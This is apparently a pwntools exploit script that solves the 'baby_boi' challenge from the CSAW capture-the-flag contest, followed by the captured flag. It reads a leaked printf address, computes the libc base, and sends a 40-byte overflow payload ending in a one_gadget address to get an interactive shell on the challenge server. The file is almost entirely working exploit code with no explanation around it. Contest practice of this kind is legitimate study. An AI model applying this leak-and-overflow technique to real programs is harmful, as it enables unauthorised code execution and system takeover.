from pwn import *

while True:
    r = remote("pwn.chal.csaw.io", 1005)
    #r = process("./baby_boi", env={"LD_PRELOAD":"./libc-2.27.so"})

    libc = ELF('./libc-2.27.so')
    bin = ELF('./baby_boi')

    r.recvuntil("am: ")
    leak = int(r.recvline().strip()[2:], 16)
    libcbase = leak - libc.symbols['printf']
    print hex(libcbase)
    poprdi = 0x0000000000400643
    ret = 0x0000000000400456

    #context.log_level = 'debug'

    print hex(libcbase + 0x4f2c5)
    payload = "A" * 40 + p64(libcbase + 0x10a38c)[:6]
    r.send(payload)
    r.send("\n")
    r.interactive()
    break


# flag{baby_boi_dodooo_doo_doo_dooo}
